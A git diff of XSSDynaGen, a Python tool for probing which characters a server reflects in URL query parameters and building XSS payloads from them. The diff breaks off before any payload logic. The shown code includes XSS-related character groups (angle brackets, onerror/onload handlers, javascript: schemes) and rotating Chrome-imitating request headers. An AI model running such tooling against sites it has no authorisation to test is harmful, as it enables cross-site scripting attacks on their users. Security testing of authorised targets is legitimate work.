@@ -1,24 +1,27 @@
 #!/usr/bin/env python3
+"""XSSDynaGen - Dynamic XSS Payload Generator based on server-side character reflection analysis."""
 
 import os
-import asyncio
-import aiohttp
+import sys
+import re
+import json
+import time
+import random
 import string
-import urllib.parse
+import asyncio
 import logging
 import argparse
-from tqdm.asyncio import tqdm_asyncio
-from typing import Set, Optional, Tuple, List, Dict, Any
-from dataclasses import dataclass
+import warnings
+import subprocess
+import urllib.parse
 from pathlib import Path
 from datetime import datetime
-from colorama import init, Style, Fore
-import subprocess
-import re
-import sys
-import time
-import warnings
-import random
+from typing import Set, Optional, Tuple, List, Dict, Any
+from dataclasses import dataclass, field
+
+import aiohttp
+from tqdm import tqdm
+from colorama import init as colorama_init, Style, Fore
 
 try:
     import uvloop
@@ -26,805 +29,543 @@ try:
 except ImportError:
     pass
 
+VERSION = "2.0.0"
 DEFAULT_MAX_CONNECTIONS = 40
-DEFAULT_BATCH_SIZE = 10
-VERSION = "0.0.1"
+DEFAULT_TIMEOUT = 10
+DEFAULT_DELAY = 0
+DEFAULT_RETRIES = 2
 GITHUB_REPOSITORY: str = "Cybersecurity-Ethical-Hacker/xssdynagen"
 GITHUB_URL: str = f"https://github.com/{GITHUB_REPOSITORY}"
+MAX_LOG_SIZE = 10 * 1024 * 1024
+
+_color_enabled = True
+
+
+def C(text: str, color: str) -> str:
+    return f"{color}{text}{Style.RESET_ALL}" if _color_enabled else str(text)
+
 
 class CacheManager:
-    def __init__(self, ttl: int = 300):
-        self.cache: Dict[str, Tuple[bool, float]] = {}
-        self.ttl = ttl
+    """TTL-based cache for reflection test results."""
+
+    def __init__(self, ttl: int = 600):
+        self._store: Dict[str, Tuple[bool, float]] = {}
+        self._ttl = ttl
+        self.hits = 0
+        self.misses = 0
 
     def get(self, key: str) -> Optional[bool]:
-        if key in self.cache:
-            result, timestamp = self.cache[key]
-            if time.time() - timestamp <= self.ttl:
+        entry = self._store.get(key)
+        if entry is not None:
+            result, ts = entry
+            if time.time() - ts <= self._ttl:
+                self.hits += 1
                 return result
-            del self.cache[key]
+            del self._store[key]
+        self.misses += 1
         return None
 
     def set(self, key: str, value: bool):
-        self.cache[key] = (value, time.time())
+        self._store[key] = (value, time.time())
 
-    def clear_expired(self):
-        current_time = time.time()
-        self.cache = {
-            k: v for k, v in self.cache.items()
-            if current_time - v[1] <= self.ttl
-        }
+    @property
+    def size(self) -> int:
+        return len(self._store)
+
 
 def filter_urls(urls: List[str]) -> Tuple[List[str], int]:
+    """Deduplicate URLs by (base, param-names) pattern; drop URLs without query params."""
     filtered = []
-    seen_patterns = set()
-    seen_params = {}
-    no_params_count = 0
-    url_pattern = re.compile(r'^https?://')
-    special_chars = re.compile(r'[^\w\-./&?=%]')
+    seen: Set[Tuple[str, frozenset]] = set()
+    skipped = 0
+    url_re = re.compile(r'^https?://')
 
-    for url in urls:
-        url = url.strip()
-        if not url or not url_pattern.match(url):
+    for raw in urls:
+        url = raw.strip()
+        if not url or not url_re.match(url):
             continue
-        if special_chars.findall(url):
-            ratio = len(special_chars.findall(url)) / len(url)
-            if ratio > 0.5:
-                continue
         try:
-            parsed = urllib.parse.urlparse(url)
-            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-            if not parsed.query:
-                no_params_count += 1
+            p = urllib.parse.urlparse(url)
+            if not p.query:
+                skipped += 1
                 continue
-            params = frozenset(urllib.parse.parse_qs(parsed.query, keep_blank_values=True))
-            pattern = (base_url, params)
-            if pattern not in seen_patterns:
-                seen_patterns.add(pattern)
+            base = f"{p.scheme}://{p.netloc}{p.path}"
+            params = frozenset(urllib.parse.parse_qs(p.query, keep_blank_values=True))
+            key = (base, params)
+            if key not in seen:
+                seen.add(key)
                 filtered.append(url)
         except Exception:
             continue
-    return filtered, no_params_count
+    return filtered, skipped
 
-def setup_logging():
+
+def setup_logging(verbose: bool = False):
     log_dir = Path('logs')
     log_dir.mkdir(exist_ok=True)
-    log_file = log_dir / 'xssdynagen_logs.txt'
-    MAX_LOG_SIZE = 10 * 1024 * 1024
+    log_file = log_dir / 'xssdynagen.log'
+
     try:
         if log_file.exists() and log_file.stat().st_size > MAX_LOG_SIZE:
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            backup_file = log_dir / f'xssdynagen_logs_{timestamp}.backup'
-            log_file.rename(backup_file)
-    except Exception as e:
-        print(f"{Fore.RED}Error managing log file: {str(e)}{Style.RESET_ALL}")
+            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+            log_file.rename(log_dir / f'xssdynagen_{ts}.log.bak')
+    except OSError:
+        pass
 
-    file_handler = logging.FileHandler(log_file)
-    file_handler.setLevel(logging.INFO)
-    file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
+    fh = logging.FileHandler(log_file, encoding='utf-8')
+    fh.setLevel(logging.DEBUG)
+    fh.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))
 
-    console_handler = logging.StreamHandler()
-    console_handler.setLevel(logging.CRITICAL)
+    ch = logging.StreamHandler()
+    ch.setLevel(logging.DEBUG if verbose else logging.WARNING)
+    ch.setFormatter(logging.Formatter('%(levelname)s: %(message)s'))
 
-    logging.basicConfig(
-        level=logging.INFO,
-        handlers=[file_handler, console_handler]
-    )
+    logging.basicConfig(level=logging.DEBUG, handlers=[fh, ch])
+    for name in ('aiohttp', 'asyncio'):
+        lg = logging.getLogger(name)
+        lg.setLevel(logging.WARNING)
+        lg.handlers = [fh]
+        lg.propagate = False
 
-    for logger_name in ['aiohttp', 'asyncio']:
-        logger = logging.getLogger(logger_name)
-        logger.setLevel(logging.WARNING)
-        logger.handlers = []
-        logger.addHandler(file_handler)
-        logger.propagate = False
-
-init(autoreset=True)
-setup_logging()
-warnings.filterwarnings('ignore', category=RuntimeWarning, module='asyncio')
-
-def print_colored(text: str, color: str = Fore.WHITE, end: str = '\n') -> None:
-    print(f"{color}{text}{Style.RESET_ALL}", end=end)
-
-@dataclass
-class ParamAnalysis:
-    param: str
-    url: str
-    allowed_chars: Set[str]
-    blocked_chars: Set[str]
-    max_length: Optional[int]
-    allows_spaces: bool
-    allows_quotes: bool
-    allows_angles: bool
-    allows_parens: bool
-    allows_scripts: bool
-    allows_events: bool
-
-class GitHandler:
-    @staticmethod
-    def check_git() -> Tuple[bool, str]:
-        try:
-            env = os.environ.copy()
-            env["GIT_ASKPASS"] = "echo"
-            env["GIT_TERMINAL_PROMPT"] = "0"
-            with open(os.devnull, 'w') as devnull:
-                result = subprocess.run(
-                    ['git', '--version'],
-                    stdout=subprocess.PIPE,
-                    stderr=devnull,
-                    text=True,
-                    check=True,
-                    timeout=2,
-                    env=env
-                )
-            return True, result.stdout.strip()
-        except FileNotFoundError:
-            return False, "Git is not installed"
-        except subprocess.TimeoutExpired:
-            return False, "Git command timed out"
-        except subprocess.CalledProcessError:
-            return False, "Git error"
-        except Exception:
-            return False, "Git check failed"
-
-    @staticmethod
-    def check_repo_status() -> Tuple[bool, str]:
-        try:
-            env = os.environ.copy()
-            env["GIT_ASKPASS"] = "echo"
-            env["GIT_TERMINAL_PROMPT"] = "0"
-            with open(os.devnull, 'w') as devnull:
-                subprocess.run(
-                    ['git', 'rev-parse', '--git-dir'],
-                    stdout=subprocess.PIPE,
-                    stderr=devnull,
-                    text=True,
-                    check=True,
-                    timeout=2,
-                    env=env
-                )
-            return True, "Repository OK"
-        except:
-            return False, "Repository not initialized"
 
 class CharacterSetLoader:
+    DEFAULT_GROUPS = {
+        'basic': string.ascii_letters + string.digits,
+        'special': '<>()\'"`{}[];/@\\*&^%$#!~:,.-_',
+        'spaces': ' \t\n\r',
+        'encoded': '%20%0A%0D%3C%3E%22%27%3B%28%29',
+        'unicode': '\u0022\u0027\u003C\u003E',
+        'null_bytes': '\x00\x0D\x0A',
+        'double_encoding': '%253C%253E%2522%2527',
+        'html_entities': '&lt;&gt;&quot;&apos;',
+        'comments': '<!---->/**/<!--',
+        'protocol_handlers': 'javascript:data:vbscript:',
+        'event_handlers': 'onmouseover=onload=onerror=onfocus=',
+    }
+
     def __init__(self, file_path: Optional[str] = None):
         self.file_path = file_path
-        self.char_groups = {
-            'basic': string.ascii_letters + string.digits,
-            'special': '<>()\'"`{}[];/@\\*&^%$#!',
-            'spaces': ' \t\n\r',
-            'encoded': '%20%0A%0D%3C%3E%22%27%3B%28%29',
-            'unicode': '\u0022\u0027\u003C\u003E',
-            'null_bytes': '\x00\x0D\x0A',
-            'alternating_case': 'ScRiPt',
-            'double_encoding': '%253C%253E%2522%2527',
-            'html_entities': '&lt;&gt;&quot;&apos;',
-            'comments': '<!---->/**/<!--',
-            'protocol_handlers': 'javascript:data:vbscript:',
-            'event_handlers': 'onmouseover=onload=onerror=onfocus='
-        }
 
-    def load_from_file(self) -> Dict[str, str]:
+    def load(self) -> Dict[str, str]:
         if not self.file_path:
-            return self.char_groups
+            return dict(self.DEFAULT_GROUPS)
         try:
+            groups: Dict[str, str] = {}
+            current: Optional[str] = None
             with open(self.file_path, 'r', encoding='utf-8') as f:
-                custom_chars = {}
-                current_group = None
                 for line in f:
                     line = line.strip()
                     if not line or line.startswith('#'):
                         continue
                     if line.startswith('[') and line.endswith(']'):
-                        current_group = line[1:-1].strip().lower()
-                        custom_chars[current_group] = ''
+                        current = line[1:-1].strip().lower()
+                        groups.setdefault(current, '')
                         continue
-                    if current_group:
-                        seen = set(custom_chars[current_group])
-                        for char in line:
-                            if char not in seen:
-                                custom_chars[current_group] += char
-                                seen.add(char)
-            return custom_chars if custom_chars else self.char_groups
+                    if current is not None:
+                        existing = set(groups[current])
+                        for ch in line:
+                            if ch not in existing:
+                                groups[current] += ch
+                                existing.add(ch)
+            return groups if groups else dict(self.DEFAULT_GROUPS)
         except FileNotFoundError:
-            logging.warning(f"Character file not found: {self.file_path}")
-            return self.char_groups
+            logging.warning(f"Character file not found: {self.file_path}, using defaults")
+            return dict(self.DEFAULT_GROUPS)
         except Exception as e:
-            logging.error(f"Error loading character file: {str(e)}")
-            return self.char_groups
+            logging.error(f"Error loading character file: {e}")
+            return dict(self.DEFAULT_GROUPS)
+
+    def get_unique_chars(self) -> Set[str]:
+        return set(''.join(self.load().values()))
+
+
+class AutoUpdater:
+    """Git-based auto-updater with non-interactive, timeout-guarded subprocess calls."""
+
+    def __init__(self):
+        self.repo_path = Path(__file__).parent
+        self.is_git_repo = self._probe_git()
+        self.branch = self._detect_branch() if self.is_git_repo else None
+
+    def _git(self, args: List[str], timeout: int = 5) -> Optional[str]:
+        env = os.environ.copy()
+        env.update({"GIT_ASKPASS": "echo", "GIT_TERMINAL_PROMPT": "0"})
+        try:
+            r = subprocess.run(
+                ['git'] + args,
+                cwd=self.repo_path,
+                capture_output=True,
+                text=True,
+                timeout=timeout,
+                env=env,
+            )
+            return r.stdout.strip() if r.returncode == 0 else None
+        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
+            return None
+
+    def _probe_git(self) -> bool:
+        return self._git(['rev-parse', '--git-dir']) is not None
+
+    def _detect_branch(self) -> str:
+        branch = self._git(['rev-parse', '--abbrev-ref', 'HEAD'])
+        return branch if branch and branch != 'HEAD' else 'main'
+
+    def _remote_version(self) -> Optional[str]:
+        if self._git(['fetch', '--tags', 'origin'], timeout=10) is None:
+            return None
+        tag = self._git(['describe', '--tags', '--abbrev=0', f'origin/{self.branch}'])
+        return tag.lstrip('v') if tag else None
+
+    def _local_version(self) -> str:
+        tag = self._git(['describe', '--tags', '--abbrev=0'])
+        return tag.lstrip('v') if tag else VERSION
 
     @staticmethod
-    def validate_char_groups(char_groups: Dict[str, str]) -> bool:
-        return all(
-            isinstance(group, str) and isinstance(chars, str)
-            for group, chars in char_groups.items()
-        )
-
-    def get_all_unique_chars(self) -> Set[str]:
-        chars = self.load_from_file()
-        return set(''.join(chars.values()))
-
-class VersionManager:
-    def __init__(self, file_path: str) -> None:
-        self.file_path = Path(file_path)
-        self.version_pattern = re.compile(r'VERSION\s*=\s*["\']([0-9]+\.[0-9]+\.[0-9]+)["\']')
-
-    def get_current_version(self) -> str:
+    def _ver_tuple(v: str) -> Tuple[int, ...]:
         try:
-            content = self.file_path.read_text()
-            match = self.version_pattern.search(content)
-            if match:
-                return match.group(1)
-            raise ValueError("VERSION variable not found in file")
-        except Exception as e:
-            logging.error(f"Error reading version: {e}")
-            return "0.0.1"
+            return tuple(int(x) for x in v.split('.'))
+        except (ValueError, AttributeError):
+            return (0, 0, 0)
 
-    def update_version(self, new_version: str) -> bool:
-        try:
-            content = self.file_path.read_text()
-            updated_content = self.version_pattern.sub(f'VERSION = "{new_version}"', content)
-            self.file_path.write_text(updated_content)
-            return True
-        except Exception as e:
-            logging.error(f"Error updating version: {e}")
-            return False
-
-class Updater:
-    def __init__(self) -> None:
-        self.current_version: str = VERSION
-        self.repo_path: Path = Path(__file__).parent
-        self.is_git_repo: bool = self._check_git_repo()
-        self.default_branch: Optional[str] = self._detect_default_branch()
-
-    def _check_git_repo(self) -> bool:
-        try:
-            subprocess.run(
-                ['git', 'rev-parse', '--git-dir'],
-                cwd=self.repo_path,
-                capture_output=True,
-                check=True
-            )
-            return True
-        except subprocess.CalledProcessError:
-            return False
-        except Exception:
-            return False
-
-    def _detect_default_branch(self) -> Optional[str]:
+    def check(self) -> Dict[str, Any]:
         if not self.is_git_repo:
-            return None
-        try:
-            result = subprocess.run(
-                ['git', 'remote', 'show', 'origin'],
-                cwd=self.repo_path,
-                capture_output=True,
-                text=True,
-                check=True
-            )
-            for line in result.stdout.split('\n'):
-                if 'HEAD branch:' in line:
-                    return line.split(':')[1].strip()
-            for branch in ['main', 'master']:
-                check_branch = subprocess.run(
-                    ['git', 'rev-parse', '--verify', f'origin/{branch}'],
-                    cwd=self.repo_path,
-                    capture_output=True
-                )
-                if check_branch.returncode == 0:
-                    return branch
-        except:
-            pass
-        return 'main'
+            return {'current': VERSION, 'update': None, 'message': 'Not a git repository'}
+        local = self._local_version()
+        remote = self._remote_version()
+        if remote is None:
+            return {'current': local, 'update': None, 'message': 'Check skipped'}
+        if self._ver_tuple(remote) > self._ver_tuple(local):
+            return {'current': local, 'update': remote, 'message': f'Update available: {remote}'}
+        return {'current': local, 'update': None, 'message': 'Up to date'}
 
-    def _run_git_command(self, command: List[str]) -> Optional[str]:
+    def apply_update(self) -> Dict[str, Any]:
         if not self.is_git_repo:
-            return None
-        try:
-            result = subprocess.run(
-                command,
-                cwd=self.repo_path,
-                capture_output=True,
-                text=True,
-                check=True
-            )
-            return result.stdout.strip()
-        except subprocess.CalledProcessError:
-            return None
+            return {'ok': False, 'message': 'Not a git repository'}
+        info = self.check()
+        if info['update'] is None:
+            return {'ok': True, 'message': info['message'], 'version': info['current']}
+        if self._git(['reset', '--hard', f'origin/{self.branch}']) is None:
+            return {'ok': False, 'message': 'Reset failed'}
+        pull = self._git(['pull', '--force', 'origin', self.branch], timeout=30)
+        if pull is None:
+            return {'ok': False, 'message': 'Pull failed'}
+        return {'ok': True, 'message': 'Updated successfully', 'version': info['update']}
 
-class AutoUpdater(Updater):
-    def _check_git_repo(self) -> bool:
-        try:
-            env = os.environ.copy()
-            env["GIT_ASKPASS"] = "echo"
-            env["GIT_TERMINAL_PROMPT"] = "0"
-            with open(os.devnull, 'w') as devnull:
-                subprocess.run(
-                    ['git', 'rev-parse', '--git-dir'],
-                    stdout=subprocess.PIPE,
-                    stderr=devnull,
-                    text=True,
-                    check=True,
-                    timeout=2,
-                    env=env,
-                    cwd=self.repo_path
-                )
-            return True
-        except:
-            return False
 
-    def _detect_default_branch(self) -> Optional[str]:
-        if not self.is_git_repo:
-            return None
-        try:
-            env = os.environ.copy()
-            env["GIT_ASKPASS"] = "echo"
-            env["GIT_TERMINAL_PROMPT"] = "0"
-            with open(os.devnull, 'w') as devnull:
-                result = subprocess.run(
-                    ['git', 'rev-parse', '--abbrev-ref', 'HEAD'],
-                    stdout=subprocess.PIPE,
-                    stderr=devnull,
-                    text=True,
-                    check=True,
-                    timeout=2,
-                    env=env,
-                    cwd=self.repo_path
-                )
-                return result.stdout.strip() or 'main'
-        except:
-            return 'main'
+@dataclass
+class ParamAnalysis:
+    param: str
+    url: str
+    allowed_chars: Set[str] = field(default_factory=set)
+    blocked_chars: Set[str] = field(default_factory=set)
+    max_length: Optional[int] = None
+    allows_spaces: bool = False
+    allows_quotes: bool = False
+    allows_angles: bool = False
+    allows_parens: bool = False
+    allows_scripts: bool = False
+    allows_events: bool = False
 
-    def _run_git_command(self, command: List[str]) -> Optional[str]:
-        if not self.is_git_repo:
-            return None
-        try:
-            env = os.environ.copy()
-            env["GIT_ASKPASS"] = "echo"
-            env["GIT_TERMINAL_PROMPT"] = "0"
-            with open(os.devnull, 'w') as devnull:
-                result = subprocess.run(
-                    command,
-                    stdout=subprocess.PIPE,
-                    stderr=devnull,
-                    text=True,
-                    check=True,
-                    timeout=2,
-                    env=env,
-                    cwd=self.repo_path
-                )
-            return result.stdout.strip()
-        except:
-            return None
-
-    def _get_remote_changes(self) -> Tuple[bool, str]:
-        if not self.default_branch:
-            return False, "Check skipped"
-        env = os.environ.copy()
-        env["GIT_ASKPASS"] = "echo"
-        env["GIT_TERMINAL_PROMPT"] = "0"
-        try:
-            with open(os.devnull, 'w') as devnull:
-                fetch_result = subprocess.run(
-                    ['git', 'fetch', '--tags', 'origin'],
-                    stdout=subprocess.PIPE,
-                    stderr=devnull,
-                    text=True,
-                    timeout=2,
-                    env=env,
-                    cwd=self.repo_path
-                )
-            if fetch_result.returncode != 0:
-                return False, "Check skipped"
-        except:
-            return False, "Check skipped"
-        try:
-            with open(os.devnull, 'w') as devnull:
-                result = subprocess.run(
-                    ['git', 'describe', '--tags', '--abbrev=0', f'origin/{self.default_branch}'],
-                    stdout=subprocess.PIPE,
-                    stderr=devnull,
-                    text=True,
-                    timeout=2,
-                    env=env,
-                    cwd=self.repo_path
-                )
-            remote_tag = result.stdout.strip()
-            if not remote_tag:
-                return False, "Check skipped"
-            remote_version = remote_tag.lstrip('v')
-            current_version = self.current_version
-            def version_tuple(v: str) -> Tuple[int, ...]:
-                try:
-                    return tuple(map(int, (v or '').split('.')))
-                except:
-                    return (0, 0, 0)
-            remote_parts = version_tuple(remote_version)
-            current_parts = version_tuple(current_version)
-            if remote_parts > current_parts:
-                return True, remote_version
-            else:
-                return False, current_version
-        except:
-            return False, "Check skipped"
-
-    def _perform_update(self) -> Dict[str, Any]:
-        if not self.default_branch:
-            return {
-                'status': 'error',
-                'message': 'No default branch detected'
-            }
-        if not self._run_git_command(['git', 'reset', '--hard', f'origin/{self.default_branch}']):
-            return {
-                'status': 'error',
-                'message': 'Update failed'
-            }
-        pull_output = self._run_git_command(['git', 'pull', '--force', 'origin', self.default_branch])
-        if not pull_output:
-            return {
-                'status': 'error',
-                'message': 'Pull failed'
-            }
-        current_tag = self._run_git_command(['git', 'describe', '--tags', '--abbrev=0']) or VERSION
-        return {
-            'status': 'success',
-            'message': 'Update successful',
-            'version': current_tag.lstrip('v'),
-            'changes': pull_output,
-            'updated': True
-        }
-
-    def _compare_versions(self, v1: str, v2: str) -> bool:
-        try:
-            v1_parts = list(map(int, v1.split('.')))
-            v2_parts = list(map(int, v2.split('.')))
-            while len(v1_parts) < len(v2_parts):
-                v1_parts.append(0)
-            while len(v2_parts) < len(v1_parts):
-                v2_parts.append(0)
-            return v1_parts > v2_parts
-        except:
-            return False
-
-    def check_and_update(self) -> Dict[str, Any]:
-        if not self.is_git_repo:
-            return {
-                'status': 'error',
-                'message': 'Not a git repository'
-            }
-        has_changes, info = self._get_remote_changes()
-        if info == "Check skipped":
-            return {
-                'status': 'success',
-                'message': 'Check skipped',
-                'version': self.current_version,
-                'updated': False
-            }
-        elif not has_changes:
-            return {
-                'status': 'success',
-                'message': 'Already at latest version',
-                'version': self.current_version,
-                'updated': False
-            }
-        update_result = self._perform_update()
-        return update_result
 
 class XSSParamAnalyzer:
-    @staticmethod
-    def get_default_headers() -> Dict[str, str]:
-        chrome_versions = [
-            "122.0.6261.112",
-            "121.0.6167.184",
-            "120.0.6099.130"
-        ]
-        languages = [
-            "en-US,en;q=0.9",
-            "en-GB,en;q=0.9",
-            "en-US,en;q=0.9,es;q=0.8",
-            "en-US,en;q=0.9,fr;q=0.8"
-        ]
-        chrome_version = random.choice(chrome_versions)
-        language = random.choice(languages)
-        return {
-            'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'Accept-Language': language,
+    CHROME_VERSIONS = [
+        "131.0.6778.204", "130.0.6723.117", "129.0.6668.100",
+        "128.0.6613.138", "127.0.6533.120",
+    ]
+    ACCEPT_LANGUAGES = [
+        "en-US,en;q=0.9", "en-GB,en;q=0.9",
+        "en-US,en;q=0.9,es;q=0.8", "en-US,en;q=0.9,fr;q=0.8",
+    ]
+
+    def __init__(
+        self, *,
+        max_connections: int = DEFAULT_MAX_CONNECTIONS,
+        timeout: int = DEFAULT_TIMEOUT,
+        output_file: str = 'xss_payloads_gen',
+        headers: Optional[Dict[str, str]] = None,
+        char_file: Optional[str] = None,
+        proxy: Optional[str] = None,
+        delay: int = DEFAULT_DELAY,
+        retries: int = DEFAULT_RETRIES,
+        verbose: bool = False,
+        quiet: bool = False,
+    ):
+        self.max_connections = max_connections
+        self.timeout = timeout
+        self.output_file = output_file
+        self.custom_headers = headers or {}
+        self.proxy = proxy
+        self._delay = delay / 1000 if delay > 0 else 0.0
+        self.retries = retries
+        self.verbose = verbose
+        self.quiet = quiet
+
+        self.session: Optional[aiohttp.ClientSession] = None
+        self.cache = CacheManager(ttl=600)
+        self._rate_sem: Optional[asyncio.Semaphore] = None
+
+        self.char_loader = CharacterSetLoader(char_file)
+        self.char_groups = self.char_loader.load()
+
+        self.payloads_dir = Path('payloads')
+        self.payloads_dir.mkdir(exist_ok=True)
+
+        self.stats = {'requests': 0, 'failures': 0, 'params_analyzed': 0}
+
+    def _build_headers(self) -> Dict[str, str]:
+        cv = random.choice(self.CHROME_VERSIONS)
+        major = cv.split('.')[0]
+        lang = random.choice(self.ACCEPT_LANGUAGES)
+        h = {
+            'User-Agent': (
+                f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
+                f'(KHTML, like Gecko) Chrome/{cv} Safari/537.36'
+            ),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': lang,
             'Accept-Encoding': 'gzip, deflate, br',
             'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-            'Sec-Ch-Ua': f'"Chromium";v="{chrome_version}", "Google Chrome";v="{chrome_version}", "Not(A:Brand";v="24"',
+            'Sec-Ch-Ua': f'"Chromium";v="{major}", "Google Chrome";v="{major}"',
             'Sec-Ch-Ua-Mobile': '?0',
             'Sec-Ch-Ua-Platform': '"Windows"',
-            'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
-            'Sec-Ch-Ua-Full-Version-List': f'"Chromium";v="{chrome_version}", "Google Chrome";v="{chrome_version}", "Not(A:Brand";v="24.0.0.0"',
-            'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'same-site']),
+            'Sec-Fetch-Site': 'none',
             'Sec-Fetch-Mode': 'navigate',
             'Sec-Fetch-User': '?1',
             'Sec-Fetch-Dest': 'document',
             'Upgrade-Insecure-Requests': '1',
             'Connection': 'keep-alive',
-            'Priority': random.choice(['u=0, i', 'u=1, i']),
-            'Viewport-Width': random.choice(['1920', '1600', '1440']),
-            'Device-Memory': random.choice(['8', '4', '6']),
-            'Permissions-Policy': 'interest-cohort=()',
-            'DNT': '1'
+            'DNT': '1',
         }
-
-    def __init__(self, max_connections: int = DEFAULT_MAX_CONNECTIONS, batch_size: int = DEFAULT_BATCH_SIZE,
-                 timeout: int = 5, output_file: str = 'xss_payloads_gen', headers: Dict[str, str] = None,
-                 char_file: Optional[str] = None):
-        self.max_connections = max_connections
-        self.batch_size = batch_size
-        self.timeout = timeout
-        self.output_file = output_file
-        self.custom_headers = headers or {}
-        self.session: Optional[aiohttp.ClientSession] = None
-        self.char_loader = CharacterSetLoader(char_file)
-        self.char_groups = self.char_loader.load_from_file()
-        self.payloads_dir = Path('payloads')
-        self.payloads_dir.mkdir(exist_ok=True)
-        self.char_cache: Dict[str, bool] = {}
-        repo_status, repo_message = GitHandler.check_repo_status()
-        if not repo_status:
-            self.version_info = {
-                'current': VERSION,
-                'update_available': 'Unknown (No Repository)'
-            }
-        else:
-            self.version_info = self._check_version()
-
-    def _get_current_version(self) -> str:
-        try:
-            env = os.environ.copy()
-            env["GIT_ASKPASS"] = "echo"
-            env["GIT_TERMINAL_PROMPT"] = "0"
-            with open(os.devnull, 'w') as devnull:
-                result = subprocess.run(
-                    ['git', 'describe', '--tags', '--abbrev=0'],
-                    stdout=subprocess.PIPE,
-                    stderr=devnull,
-                    text=True,
-                    check=True,
-                    timeout=2,
-                    env=env,
-                    cwd=Path(__file__).parent
-                )
-            version = result.stdout.strip()
-            if not version:
-                return "Unknown"
-            return version.lstrip('v')
-        except:
-            return "Unknown"
-
-    def _get_remote_version(self) -> Optional[str]:
-        try:
-            env = os.environ.copy()
-            env["GIT_ASKPASS"] = "echo"
-            env["GIT_TERMINAL_PROMPT"] = "0"
-            with open(os.devnull, 'w') as devnull:
-                fetch_result = subprocess.run(
-                    ['git', 'fetch', '--tags', 'origin'],
-                    stdout=subprocess.PIPE,
-                    stderr=devnull,
-                    text=True,
-                    timeout=2,
-                    env=env,
-                    cwd=Path(__file__).parent
-                )
-                if fetch_result.returncode != 0:
-                    return None
-                result = subprocess.run(
-                    ['git', 'describe', '--tags', '--abbrev=0', 'origin/main'],
-                    stdout=subprocess.PIPE,
-                    stderr=devnull,
-                    text=True,
-                    check=True,
-                    timeout=2,
-                    env=env,
-                    cwd=Path(__file__).parent
-                )
-            version = result.stdout.strip()
-            return version.lstrip('v') if version else None
-        except:
-            return None
-
-    def _check_version(self) -> Dict[str, str]:
-        try:
-            current_version = self._get_current_version()
-            if current_version == "Unknown":
-                return {
-                    'current': current_version,
-                    'update_available': 'Unknown'
-                }
-            remote_version = self._get_remote_version()
-            if remote_version is None:
-                return {
-                    'current': current_version,
-                    'update_available': 'Check skipped'
-                }
-            def version_tuple(v: str) -> Tuple[int, ...]:
-                try:
-                    return tuple(map(int, (v or '').split('.')))
-                except:
-                    return (0, 0, 0)
-            remote_parts = version_tuple(remote_version)
-            current_parts = version_tuple(current_version)
-            if remote_parts > current_parts:
-                return {
-                    'current': current_version,
-                    'update_available': 'Yes'
-                }
-            else:
-                return {
-                    'current': current_version,
-                    'update_available': 'No'
-                }
-        except:
-            return {
-                'current': self._get_current_version(),
-                'update_available': 'Check skipped'
-            }
-
-    def banner(self) -> None:
-        banner_width = 86
-        def center_text(text: str, width: int = banner_width) -> str:
-            return text.center(width)
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        output_path = self.payloads_dir / f"{self.output_file}_{timestamp}.txt"
-        logo = f"""
-{Fore.RED}██╗  ██╗███████╗███████╗██████╗ ██╗   ██╗███╗   ██╗ █████╗  ██████╗ ███████╗███╗   ██╗
-╚██╗██╔╝██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝████╗  ██║██╔══██╗██╔════╝ ██╔════╝████╗  ██║
- ╚███╔╝ ███████╗███████╗██║  ██║ ╚████╔╝ ██╔██╗ ██║███████║██║  ███╗█████╗  ██╔██╗ ██║
- ██╔██╗ ╚════██║╚════██║██║  ██║  ╚██╔╝  ██║╚██╗██║██╔══██║██║   ██║██╔══╝  ██║╚██╗██║
-██╔╝ ██╗███████║███████║██████╔╝   ██║   ██║ ╚████║██║  ██║╚██████╔╝███████╗██║ ╚████║
-╚═╝  ╚═╝╚══════╝╚══════╝╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝{Style.RESET_ALL}"""
-        print(logo)
-        print(center_text(f"{Fore.RED}By Dimitris Chatzidimitris{Style.RESET_ALL}"))
-        print(center_text(f"{Fore.RED}Email: dimitris.chatzidimitris@gmail.com{Style.RESET_ALL}"))
-        print(center_text(f"{Fore.RED}Parameter Analysis / Server Characters Allowance / Dynamic Payloads Generation{Style.RESET_ALL}"))
-        print()
-        print_colored("🔧 Configuration:", Fore.CYAN)
-        print(f"- Version: {Fore.YELLOW}{self.version_info['current']}{Style.RESET_ALL}")
-        print(f"- Update Available: {Fore.YELLOW}{self.version_info['update_available']}{Style.RESET_ALL}")
-        print(f"- Global Max Connections: {Fore.CYAN}{self.max_connections}{Style.RESET_ALL}")
-        print(f"- Timeout: {Fore.CYAN}{self.timeout}s{Style.RESET_ALL}")
-        print(f"- Output File: {Fore.CYAN}{str(output_path.absolute())}{Style.RESET_ALL}")
-        print()
-
-    def extract_parameters(self, url: str) -> Dict[str, Optional[str]]:
-        try:
-            parsed = urllib.parse.urlparse(url)
-            params = {}
-            if not parsed.query:
-                return {}
-            param_pairs = re.split('[&;]', parsed.query)
-            for pair in param_pairs:
-                if not pair:
-                    continue
-                if '=' not in pair:
-                    params[urllib.parse.unquote(pair)] = None
-                    continue
-                param_name, value = pair.split('=', 1)
-                param_name = urllib.parse.unquote(param_name)
-                value = urllib.parse.unquote(value) if value else None
-                params[param_name] = value
-            return params
-        except Exception as e:
-            logging.error(f"Error parsing URL parameters: {str(e)}")
-            return {}
-
-    def validate_url_parameters(self, url: str) -> bool:
-        try:
